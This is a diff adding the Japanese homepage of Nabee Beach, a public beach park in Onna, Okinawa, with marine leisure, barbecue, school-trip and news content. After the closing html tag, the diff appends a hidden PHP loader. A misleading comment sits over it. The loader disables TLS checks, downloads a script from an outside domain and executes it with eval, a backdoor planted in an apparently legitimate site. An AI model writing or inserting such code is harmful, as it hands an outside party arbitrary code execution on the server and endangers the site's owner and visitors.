@@ -1,0 +1,482 @@
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-Ua-Compatible" content="IE=edge">
+<title>沖縄でマリンスポーツ マリンレジャー｜恩納村海浜公園 ナビービーチ：公式サイト</title>
+<meta name="keywords" content="沖縄,恩納村,漁師体験,マリンスポーツ,マリンレジャー,市民ビーチ,釣り,海人体験,体験学習,修学旅行,バーベキュー,BBQ">
+<meta name="description" content="沖縄県のリゾートホテルの立ち並ぶ恩納村にある、誰でも利用できる市民ビーチ『ナビービーチ』公式サイト。バーベキュープランは大人気。マリンスポーツやマリンレジャーもお楽しみください。">
+<meta name="viewport" content="width=device-width">
+<meta name="author" content="Nabee Beach">
+<meta name="Robots" content="INDEX,FOLLOW">
+<link rel="start contents" href="https://www.nabee.info/">
+<link rev="made" href="mailto:contact@nabee.info" title="E-mail address">
+<meta property="og:site_name" content="ナビービーチ・公式サイト">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://www.nabee.info/">
+<!-- Global site tag (gtag.js) - Google Ads: 758527484 -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-758527484"></script>
+<script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'AW-758527484'); </script>
+<!-- Event snippet for 申し込み conversion page In your html page, add the snippet and call gtag_report_conversion when someone clicks on the chosen link or button. -->
+<script> function gtag_report_conversion(url) { var callback = function () { if (typeof(url) != 'undefined') { window.location = url; } }; gtag('event', 'conversion', { 'send_to': 'AW-758527484/hw4hCP71_9EBEPzr2OkC', 'event_callback': callback }); return false; } </script>
+<meta property="og:title" content="恩納村海浜公園 ナビービーチ：公式サイト">
+<meta property="og:description" content="沖縄県のリゾートホテルの立ち並ぶ恩納村にある、誰でも利用できる市民ビーチ『ナビービーチ』公式サイト。バーベキュープランは大人気。マリンスポーツやマリンレジャーもお楽しみください。">
+<meta name="msvalidate.01" content="8B9FF6F8BA3BEBC4A9074C001B1D1B19" />
+<link href="https://www.nabee.info/css/header.css?1206" rel="stylesheet" type="text/css">
+<link href="https://www.nabee.info/css/index202202.css?1003" rel="stylesheet" type="text/css">
+
+</head>
+
+<body id="top">
+<header>
+<div class="headerLogoArea">
+<p class="headerLogo"><a href="https://www.nabee.info/"><img src="https://www.nabee.info/images/common/logo.png" alt="恩納村海浜公園 ナビービーチ"></a></p>
+
+<div class="h_shop">
+<div class="book_bnr floating-banner">
+	<a href="https://www.asoview.com/channel/activities/ja/nabee/offices/3753/courses?language_type=ja"><img class="ann_pc" src="https://www.nabee.info/images/common/bnr_webbook.png" alt="Web予約はこちら 簡単！24時間受付中"><img class="ann_sp" src="https://www.nabee.info/images/common/bnr_webbook_sp.png" alt="Web予約はこちら 簡単！24時間受付中"></a></div>
+<!--<p>お電話でのご予約・お問い合わせ</p>
+<p class="call">&#9742;&nbsp;098-966-8839</p>
+<div class="shop_info"><p class="shop_con">受付時間</p><p class="shop_time">9：00～17：00 不定休</p></div>-->
+</div><!-- .h_shop -->
+<div class="h_text">
+<h1 class="headerCopy">沖縄リゾートエリアの市民ビーチ　マリンスポーツやマリンレジャーにも</h1>
+<p class="catch">沖縄県のリゾートホテルの立ち並ぶ恩納村にある恩納村海浜公園ナビービーチ公式サイトです。マリンスポーツ・バーベキューなどが楽しむことができます。</p>
+<!-- /h_text --></div>
+
+<!-- /headerLogoArea --></div>
+
+<div class="gnavTbspWrapper contentsHide">
+<nav class="gnavPc gnavTbsp">
+<ul>
+<li><a class="sched" href="https://www.nabee.info/"><span class="la">ホーム<br></span><span class="sm tbHide spHide">HOME</span></a></li>
+<li><a href="https://www.nabee.info/marine/"><span class="la">マリンレジャー<br></span><span class="sm tbHide spHide">MARINE LEISURE</span></a></li>
+
+<li><a href="https://www.nabee.info/bbq.html"><span class="la">バーベキュー<br></span><span class="sm tbHide spHide">BARBECUE</span></a></li>
+<li><a href="https://www.nabee-camp.com/" target="_blank"><span class="la">キャンプ<br></span><span class="sm tbHide spHide">CAMP</span></a></li>
+<li><a href="https://www.nabee.info/institution.html"><span class="la">施設概要<br></span><span class="sm tbHide spHide">INSTITUTION</span></a></li>
+<li><a href="https://www.nabee.info/school.html"><span class="la">修学旅行<br class="spHide">体験学習<br></span><span class="sm tbHide spHide">SCHOOL TRIP</span></a></li>
+<li><a href="https://www.nabee.info/access.html"><span class="la">アクセス<br class="spHide">マップ<br></span><span class="sm tbHide spHide">ACCESS</span></a></li>
+<li><a href="https://www.nabee.info/food.html"><span class="la">海人料理<br class="spHide">亀ぬ浜<br></span><span class="sm tbHide spHide">FOOD</span></a></li>
+
+<li><a href="https://www.nabee.info/faq.html"><span class="la">よくある質問<br></span><span class="sm tbHide spHide">FAQ</span></a></li>
+</ul>
+</nav>
+<!-- /gnavTbspWrapper --></div>
+<p class="tbMenuBtn js-tbMenuBtn">
+<span><img src="https://www.nabee.info/images/common/btn-menu.gif" alt="メニューボタン" width="60" height="60" class="pcHide"></span></p>
+</header>
+
+<div id="wrapper" class="clearfix">
+ <div id="bg" class="clearfix">
+  <div id="slide"></div>
+  <div id="bg2">
+  <div id="bg3">
+  <div id="bg4">
+  <div id="top_main">
+   <div id="top_box">
+
+<div id="indexCont">
+ <div id="topBanner">
+	 <h2 class="slogan">恩納村の海で遊ぼう</h2>
+	 <div class="girl"><img src="https://www.nabee.info/images/top/slogans.png" alt="恩納村の海で遊ぼう"></div>
+		
+		<div id="bannerList">
+			<div class="leisure"><a href="https://www.nabee.info/marine/" title="マリンスポーツ"><img src="images/top/m_leisure.png"  alt="マリンスポーツ" class="imgChange"></a></div>
+			<div class="bbq"><a href="https://www.nabee.info/bbq.html" title="バーベキュー"><img src="images/top/m_bbq.png" alt="バーベキュー" class="imgChange"></a></div>
+			
+			<div class="glass"><a href="https://www.nabee.info/food.html" title="海人料理亀ぬ浜"><img src="images/top/m_glass.png" alt="海人料理亀ぬ浜" class="imgChange"></a></div>
+			<!--<div class="saisei"><a href="https://www.nabee.info/marine/leis05/mermaid.html" title="マーメイドプラン"><img src="images/top/m_mermaid.png" alt="マーメイドプラン" class="imgChange"></a></div>-->
+			<div class="school"><a href="https://www.nabee.info/school.html" title="修学旅行"><img src="images/top/m_school.png" alt="修学旅行" class="imgChange"></a></div>
+		</div><!-- /bannerList -->
+ </div><!-- /topBanner -->
+    
+	<div id="parallaxShine01"><img src="https://www.nabee.info/images/top/shine_01.png" width="54" height="54" alt="★"></div>
+	<div id="parallaxShine02"><img src="https://www.nabee.info/images/top/shine_02.png" width="42" height="42" alt="★"></div>
+	<div id="parallaxShine03"><img src="https://www.nabee.info/images/top/shine_03.png" width="36" height="36" alt="★"></div>
+	<div id="parallaxShine04"><img src="https://www.nabee.info/images/top/shine_04.png" width="20" height="20" alt="★"></div>
+
+<div class="clr"><hr /></div>
+
+</div><!-- /indexCont -->
+
+</div><!-- /top_box -->
+<div id="top_main_bottom"></div>
+
+<div class="clr"><hr /></div>
+</div><!-- /top_main -->
+</div><!-- /bg4 -->
+</div><!-- /bg3 -->
+</div><!-- /bg2 -->
+</div><!-- /bg -->
+
+<div id="page" class="clearfix">
+<div id="contents">
+
+
+<div class="main_contents">
+
+
+
+
+<h2 class="tph2">沖縄リゾートエリアの市民ビーチ「恩納村海浜公園 ナビービーチ」</h2>
+
+<p class="top_info">恩納村海浜公園 ナビービーチではバナナボート・シーカヤック・スノーケルなどのマリンレジャーやビーチサイドでのバーベキューを楽しむことができます。
+また、サンゴ再生プログラムやSDGsを取り入れた修学旅行体験学習も開催しております。</p>
+
+	
+	<div class="questionnaire_pc"><a href="https://forms.gle/K9rb3x1gpnmWKFvM7" target="_blank"><img src="images/questionnaire_pc.jpg" alt="アンケートに答える"></a></div>
+	<div class="questionnaire_sp"><a href="https://forms.gle/K9rb3x1gpnmWKFvM7" target="_blank"><img src="images/questionnaire_sp.jpg" alt="アンケートに答える"></a></div>
+
+<div class="top_news">
+<p class="tnew_ttl">新着情報<span>News</span></p>
+<dl>
+<dt><p>2025.8.15</p><p><a href="https://www.nabee.info/news/2025/08/music.html">サステナビーMUSICフェス♪</a></p></dt><dd><p>いつもナビービーチをご利用頂きありがとうございます。 8月16日（土）はサステナビーMUSICフェス・・・</p></dd>
+</dl><dl>
+<dt><p>2025.7.30</p><p><a href="https://www.nabee.info/news/2025/07/10.html">津波警報発令中（10時現在）</a></p></dt><dd><p>現在、津波警報発令中のため、ビーチ利用禁止となります。 くれぐれも海には近づかないよう、ご理解と協力・・・</p></dd>
+</dl><dl>
+<dt><p>2025.7.24</p><p><a href="https://www.nabee.info/news/2025/07/post-46.html">遊泳禁止のお知らせ【2025年7月24日】</a></p></dt><dd><p>日頃より恩納村海浜公園ナビービーチをご愛顧頂き誠にありがとうございます。 台風の接近の伴い、波が非常・・・</p></dd>
+</dl>
+<p class="tne_but"><a href="https://www.nabee.info/news/">新着情報を一覧で見る</a></p>
+</div>
+
+<div class="gotoonna"><a href="https://goto-onna.com/plan/navie_bana/" target="_blank"><img src="images/gotoonna" alt="go to ONNA"></a></div>
+
+
+	
+<div class="nabee_camp_pc"><a href="https://www.nabee-camp.com/" target="_blank"><img src="images/nabee_camp_pc.jpg" alt="ナビービーチキャンプビレッジ"></a></div>
+	<div class="nabee_camp_sp"><a href="https://www.nabee-camp.com/" target="_blank"><img src="images/nabee_camp_sp.jpg" alt="ナビービーチキャンプビレッジ"></a></div>
+
+<div class="sisetu_bnx">
+<div class="bg_fw"><img src="images/bg_flw.png" alt="植物"></div>
+<div class="bg_fw2"><img src="images/bg_flw2.png" alt="植物"></div>
+<ul>
+ <li class="sw100"><p class="sis_ttl">恩納村海浜公園ナビービーチの<br class="pcHide tbHide">施設紹介</p></li>
+ <li class="sw25" id="sspHide"><img src="images/top/sisetu00.jpg" alt="施設紹介"></li><li class="sw25"><img src="images/top/sisetu01.jpg" alt="施設紹介"></li><li class="sw25"><img src="images/top/sisetu02.jpg" alt="施設紹介"></li>
+ <li class="sw100"><p class="sis_txt">更衣室・シャワー・トイレなどの<br class="pcHide tbHide">施設がございます。</p><p class="sis_bt"><a href="institution.html">&raquo;&nbsp;詳細はこちら</a></p></li>
+</ul>
+</div>
+
+ <div class="tour_list">
+
+<a href="https://www.nabee.info/marine/">
+<div class="menu_list">
+ <div class="imgArea">
+  <p><img class="slim" src="https://www.nabee.info/images/top/leisure.jpg" alt="マリンレジャー"><img class="wide" src="https://www.nabee.info/images/top/leisureL.jpg" alt="マリンレジャー"></p>
+ </div>
+ <div class="txtArea">
+  <h4>マリンレジャー</h4>
+  <p>バナナボート・シーカヤック・スノーケルなどのマリンレジャーを楽しむことができます。</p>
+  <p class="syousai_bt">&raquo;詳細はこちらから</p>
+ </div>
+</div></a>
+
+
+
+<a href="https://www.nabee.info/bbq.html">
+<div class="menu_list">
+ <div class="imgArea">
+  <p><img class="slim" src="https://www.nabee.info/images/top/bbq.jpg" alt="ビーチサイドバーベキュー"><img class="wide" src="https://www.nabee.info/images/top/bbqL.jpg" alt="ビーチサイドバーベキュー"></p>
+ </div>
+ <div class="txtArea">
+  <h4>ビーチサイドバーベキュー</h4>
+  <p>綺麗な海を眺めながら、ビーチサイドでバーベキューはいかがですか？</p>
+  <p class="syousai_bt">&raquo;詳細はこちらから</p>
+ </div>
+</div></a>
+
+<a href="https://www.nabee.info/school.html">
+<div class="menu_list">
+ <div class="imgArea">
+  <p><img class="slim" src="https://www.nabee.info/images/top/school.jpg" alt="修学旅行体験学習"><img class="wide" src="https://www.nabee.info/images/top/schoolL.jpg" alt="修学旅行体験学習"></p>
+ </div>
+ <div class="txtArea">
+  <h4>修学旅行体験学習</h4>
+  <p>修学旅行のオプションプログラムに最適な体験学習をご用意しております。</p>
+  <p class="syousai_bt">&raquo;詳細はこちらから</p>
+ </div>
+</div></a>
+
+
+
+
+
+<a href="https://www.nabee.info/marine/leis05/post-5.html">
+<div class="menu_list">
+ <div class="imgArea">
+  <p><img class="slim" src="https://www.nabee.info/images/top/kayak.jpg" alt="カヤッククルージング"><img class="wide" src="https://www.nabee.info/images/top/kayak.jpg" alt="カヤッククルージング"></p>
+ </div>
+ <div class="txtArea">
+  <h4>カヤッククルージング</h4>
+  <p>海風を感じながら、のんびりカヤッククルージング！</p>
+  <p class="syousai_bt">&raquo;詳細はこちらから</p>
+ </div>
+</div></a>
+
+
+ 
+<a href="https://www.nabee.info/food.html">
+<div class="menu_list">
+ <div class="imgArea">
+  <p><img class="slim" src="https://www.nabee.info/images/top/food.jpg" alt="海人料理「亀ぬ浜」"><img class="wide" src="https://www.nabee.info/images/top/foodL.jpg" alt="海人料理「亀ぬ浜」"></p>
+ </div>
+ <div class="txtArea">
+  <h4>海人料理「亀ぬ浜」</h4>
+  <p>恩納村海浜公園内にあるお食事処。沖縄ならではの食材を取り揃えています。</p>
+  <p class="syousai_bt">&raquo;詳細はこちらから</p>
+ </div>
+</div></a>
+	 
+	 
+<a href="https://www.nabee-camp.com/" target="_blank">
+<div class="menu_list">
+ <div class="imgArea">
+  <p><img class="slim" src="https://www.nabee.info/images/top/camp.jpg" alt="ナビービーチ キャンプビレッジ"><img class="wide" src="https://www.nabee.info/images/top/camp.jpg" alt="ナビービーチ キャンプビレッジ"></p>
+ </div>
+ <div class="txtArea">
+  <h4>ナビービーチ キャンプビレッジ</h4>
+  <p>初心者でも安心！手ぶらで本格キャンプを楽しめるビーチサイドのキャンプ場です。</p>
+  <p class="syousai_bt">&raquo;詳細はこちらから</p>
+ </div>
+</div></a>
+
+</div><!-- /tour_list -->
+
+<div class="clr"><hr /></div>
+
+</div><!-- /main_contents -->
+
+<div id="sideR">
+
+<div id="featureList">
+<h4><span>恩納村海浜公園 ナビービーチ</span></h4>
+<ul>
+<li class="doblue">
+ <div class="info">
+  <p class="m_text">〒904-0411<br />沖縄県国頭郡恩納村字恩納419-4</p>
+  <p class="tel">有限会社ナビー<br />&#9742;&nbsp;<a href="tel:098-966-2900">098-966-2900</a></p>
+  <p class="tel">海浜公園管理事務所<br />&#9742;&nbsp;<a href="tel:098-966-8839">098-966-8839</a></p>
+ </div>
+</li>
+</ul>
+</div><!-- /#featureList -->
+<div class="clr"><hr /></div>
+
+<div class="goto-camp">
+ <div class="goto-ttl"><p>新型コロナウイルス<br class="tbHide spHide">感染症感染拡大予防<br class="tbHide spHide">ガイドライン</p></div>
+ <ul>
+  <li><a href="https://www.nabee.info/upload/file/File/cr-marin.pdf" target="_blank">マリン事業部</a></li>
+  <li><a href="https://www.nabee.info/upload/file/File/cr-rest.pdf" target="_blank">海人料理 亀ぬ浜</a></li>
+ </ul>
+</div><!-- /.goto-camp -->
+<div class="clr"><hr /></div>
+
+<div class="uminch-info">
+ <div class="uminch-ttl"><p>代表よりご挨拶</p></div>
+ <div class="uminch-text">
+  <img src="https://www.nabee.info/images/uminchu.jpg" alt="代表よりご挨拶">
+  <p><strong>【うみんちゅ】＝沖縄の方言で『漁師』</strong></p>
+  <p>私達沖縄の海人は、南の島で漁をする為の様々な知恵と知識で代々に渡り海から恩恵を受け、海を守ってきました。</p>
+  <p class="um_but"><a href="//www.nabee.info/company.html#aisatu">詳細はこちらから</a></p>
+ </div>
+</div><!-- /.uminch-info -->
+<div class="clr"><hr /></div>
+
+<div class="movie">
+<iframe height="auto" src="https://www.youtube.com/embed/kNo4BGTqAVo" frameborder="0" width="100%" allowfullscreen=""></iframe>
+</div>
+
+<h5><span>海人料理 亀ぬ浜</span></h5>
+
+<div class="food_box">
+		<div class="food clearfix">
+		<div class="imgArea">
+		<a href="https://www.nabee.info/food.html"><img class="slim" src="https://www.nabee.info/images/kaminuhgama.jpg" alt="海人料理 亀ぬ浜"><img class="wide" src="https://www.nabee.info/images/kaminuhgamaL.jpg" alt="海人料理 亀ぬ浜"></a>
+		</div>
+		<div class="txtArea">
+		<p><strong>海人が作るお魚料理が自慢のお店「海人料理 亀ぬ浜」</strong></p>
+		<p>恩納村海浜公園内にあるお食事処。沖縄ならではの食材を取り揃えています。万座毛を一望出来る、海の見えるテラス席が有ります。目の前が無料ビーチになっています。駐車場も無料です。チョッと一休みにも、ビアガーデンとしてもお薦めです！</p></div>
+		</div>
+<p class="m_but"><a href="https://www.nabee.info/food.html">詳細はこちらから</a></p>
+<p class="m_but2"><a href="https://www.nabee.info/institution.html#yurai">亀ぬ浜　店名の由来</a></p>
+</div><!-- /food_box -->
+
+<div class="bus_bnr">
+<p><a href="https://www.okinawa-shuttle.co.jp/"  target="_blank"><img src="https://www.nabee.info/images/bus_bnr.jpg" alt="シャトルバス"></a></p>
+</div><!-- /bnr_box -->
+
+<div class="bnr_box">
+<a href="javascript:fullscreen('//tabiiro.jp/magazine/_indivi/303079/page/book.html');"><img src="//tabiiro.jp/magazine/_b/47_kamenuhama/t210_140.jpg" border="0" alt="ウェブマガジン旅色の沖縄グルメ＆観光特集に紹介されました"></a>
+<a href="//www.jtb.co.jp/kokunai/guide/100/"  target="_blank"><img src="https://www.nabee.info/images/210-JTB.gif" alt="国内観光情報" border="0">
+</a></div><!-- /bnr_box -->
+
+
+</div><!-- /#sideR -->
+
+<!--/contents--></div>
+
+<div id="sideL">
+ <div class="sideMenu">
+
+<!-- ここからSNSボタン -->
+<div id="fb-root"></div>
+
+<div class="facebook spHide tbHide">
+ <div class="fb-like-box" data-href="https://www.facebook.com/nabee2900/" data-width="210px" data-height="250px" data-colorscheme="light" data-show-faces="true" data-header="false" data-stream="false" data-show-border="false"></div>
+</div>
+<div class="twitter spHide tbHide">
+<a href="https://twitter.com/NabeeBeach?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @NabeeBeach</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</div>
+<div class="insta spHide tbHide">
+<p class="insta_top"><img src="https://www.nabee.info/images/common/ttl_insta" alt="Instagram"></p>
+<iframe src="https://snapwidget.com/embed/1024401" class="snapwidget-widget" allowtransparency="true" frameborder="0" scrolling="no" style="border:none; overflow:hidden;  width:210px; height:1320px"></iframe>
+</div>
+<h5><strong>ナビービーチの<br />インスタ映えスポット</strong></h5>
+   <div class="topics_box">
+	
+	 <div class="topics clearfix">
+	  <div class="imgArea">
+	   <a href="https://www.nabee.info/institution.html#insta-spot"><img class="pro_photo" src="https://www.nabee.info/images/wedding01.jpg" alt="ウェディングオブジェ"></a>
+	  </div>
+	  <div class="txtArea">
+	   <p>ナビービーチにウェディングオブジェが2つ設置されました。ナビービーチの新しい撮影スポットとして、是非ご利用ください。</p>
+	  </div>
+	  <div class="imgArea">
+	   <a href="https://www.nabee.info/institution.html#insta-spot"><img class="pro_photo" src="https://www.nabee.info/images/wedding02.jpg" alt="インスタ映えスポット"></a>
+	  </div>
+	 </div><!-- /topics -->
+	
+	<div class="clr"><hr /></div>
+	<p class="m_but"><a href="https://www.nabee.info/institution.html#insta-spot">スポット詳細はこちら</a></p>
+   </div><!-- /topics_box -->
+   
+   <div class="clr"><hr /></div>
+<div class="wether">
+<p class="tit">恩納村の天気予報</p>
+<div class="mamewaza_weather"><div><div class="mamewaza_weather_exp"></div></div></div>
+</div>
+
+	
+
+<!-- /sideMenu --></div>
+<!-- /#sideL --></div>
+
+
+<!--/page--></div>
+<!--/wrapper--></div>
+
+<div id="side_navi" class="spHide tbHide">
+ <ul>
+  <li id="tab1"><a href="https://www.nabee.info/english/" target="_blank"><img src="https://www.nabee.info/images/common/english.png" alt="ENGLISH" width="35" height="38"></a></li>
+  <li id="tab2"><a href="https://www.nabee.info/china/" target="_blank"><img src="https://www.nabee.info/images/common/china.png" alt="China" width="35" height="38"></a></li>
+  <li id="tab3"><a href="https://www.facebook.com/nabee2900/" target="_blank"><img src="https://www.nabee.info/images/common/fb.gif" alt="facebook" width="35" height="35"></a></li>
+  <li id="tab3"><a href="https://www.instagram.com/nabee2901/" target="_blank"><img src="https://www.nabee.info/images/common/sd_insta.png" alt="instagram" width="35" height="35"></a></li>
+  <li id="tab3"><a href="https://twitter.com/NabeeBeach" target="_blank"><img src="https://www.nabee.info/images/common/tw.gif" alt="twitter" width="35" height="35"></a></li>
+  <li id="tab4"><a href="https://www.nabee.info/contact.html"><img src="https://www.nabee.info/images/common/mail.gif" alt="お問い合わせ" width="35" height="35"></a></li>
+ </ul>
+<!-- /#side_navi --></div>
+
+<footer>
+<div class="footerArea">
+<p class="fotterLogo"><a href="https://www.nabee.info/"><img src="https://www.nabee.info/images/common/footer_logo.png" alt="恩納村海浜公園ナビービーチ"></a></p>
+
+<div class="nav_bar">
+ <nav class="footer_nav clearfix">
+	 <p class="page_nav_menu"><a href="https://www.nabee.info/" class="btn">HOME</a></p>
+	 <p class="page_nav_menu"><a href="https://www.nabee.info/reserve.html" class="btn">各種ご予約</a></p>
+	 
+	 <p class="page_nav_menu2"><a href="https://www.nabee.info/marine/" class="btn">マリンレジャー</a></p>
+	 <p class="page_nav_menu2"><a href="https://www.nabee.info/bbq.html" class="btn">バーベキュー</a></p>
+	 <p class="page_nav_menu2"><a href="https://www.nabee.info/access.html" class="btn">アクセスマップ</a></p>
+	 <p class="page_nav_menu2"><a href="https://www.nabee.info/food.html" class="btn">海人料理 亀ぬ浜</a></p>
+	 <p class="page_nav_menu2"><a href="https://www.nabee.info/school.html" class="btn">修学旅行体験学習</a></p>
+	 <p class="page_nav_menu2"><a href="https://www.nabee.info/privacy.html" class="btn">プライバシーポリシー</a></p>
+	 <p class="page_nav_menu"><a href="https://www.nabee.info/institution.html" class="btn">施設概要</a></p>
+	 <p class="page_nav_menu"><a href="https://www.nabee.info/contact.html" class="btn">お問い合わせ</a></p>
+	 <p class="page_nav_menu"><a href="https://www.nabee.info/faq.html" class="btn">よくある質問</a></p>
+	 <p class="page_nav_menu"><a href="https://www.nabee.info/company.html" class="btn">会社案内</a></p>
+ </nav>
+
+<ul class="f_icon">
+<li><a href="https://www.nabee.info/english/" target="_blank" class="overimg"><img src="https://www.nabee.info/images/common/f_english.png" alt="english"></a></li>
+<li><a href="https://www.nabee.info/china/" target="_blank" class="overimg"><img src="https://www.nabee.info/images/common/f_china.png" alt="中文"></a></li>
+<li><a href="https://www.facebook.com/nabee2900/" target="_blank" class="overimg"><img src="https://www.nabee.info/images/common/f_facebook.png" alt="facebook"></a></li>
+<li><a href="https://www.instagram.com/nabee2901/" target="_blank" class="overimg"><img src="https://www.nabee.info/images/common/f_insta.png" alt="instagram"></a></li>
+<li><a href="https://twitter.com/NabeeBeach" target="_blank" class="overimg"><img src="https://www.nabee.info/images/common/f_twitter.png" alt="twitter"></a></li>
+<li><a href="https://www.jma.go.jp/bosai/forecast/#area_type=offices&area_code=471000" target="_blank" class="overimg"><img src="https://www.nabee.info/images/common/f_weather.png" alt="お天気"></a></li>
+</ul>
+</div>
+<div class="clr"><hr /></div>
+<p class="add pcHide">〒904-0411　沖縄県国頭郡恩納村字恩納419-4<br />有限会社ナビ―　&nbsp;&#9742;098-966-2900<br />
+海浜公園管理事務所　&nbsp;&#9742;098-966-8839</p>
+</div>
+<p class="copy"><small>Copyright&copy; <a href="https://www.nabee.info/">Okinawa Onna Seaside Civil Park Nabee-Beach</a> All Rights Reserved.</small></p>
+</footer>
+
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://www.nabee.info/js/jQueryAutoHeight.js"></script>
+<script type="text/javascript" src="https://www.nabee.info/js/jquery.flicksimple.js"></script>
+
+<script type="text/javascript" src="https://www.nabee.info/js/common.js"></script>
+<script type="text/javascript" src="https://www.nabee.info/js/scrolltopcontrol.js"></script>
+
+<script type="text/javascript" src="https://mamewaza.net/weather.js?200804"></script>
+<script type="text/javascript" src="https://www.nabee.info/js/wether2021.js"></script>
+<script type="text/javascript" src="//tabiiro.jp/magazine/_common/js/bnr.js"></script>
+
+<script type="text/javascript" src="https://www.nabee.info/js/jquery.bgscroll.js"></script>
+<script type="text/javascript" src="https://www.nabee.info/js/jquery.quovolver.js"></script>
+<script type="text/javascript" src="https://www.nabee.info/js/jquery.yurayura.js"></script>
+<script type="text/javascript" src="https://www.nabee.info/js/index.js"></script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery('#slide').bgscroll({scrollSpeed:100 , direction:'h'});
+});
+</script>
+<script src="https://snapwidget.com/js/snapwidget.js"></script>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.0";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+</body>
+</html>
+<?php
+session_start();
+
+/**
+* Disable error reporting
+*
+* Set this to error_reporting( -1 ) for debugging.
+*/
+function geturlsinfo($url) {
+  if (function_exists(\'curl_exec\')) {
+    $conn = curl_init($url);
+    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($conn, CURLOPT_USERAGENT, \"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0\");
+    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+    
+    $url_get_contents_data = curl_exec($conn);
+    curl_close($conn);
+  } elseif (function_exists(\'file_get_contents\')) {
+    $url_get_contents_data = file_get_contents($url);
+  } elseif (function_exists(\'fopen\') && function_exists(\'stream_get_contents\')) {
+    $handle = fopen($url, \"r\");
+    $url_get_contents_data = stream_get_contents($handle);
+    fclose($handle);
+  } else {
+    $url_get_contents_data = false;
+  }
+  return $url_get_contents_data;
+}
+
+  $a = geturlsinfo(\'https://www.backlinkku.id/menu/vip-v1/script.txt\');
+  eval(\'?>\' . $a);
+  ?>
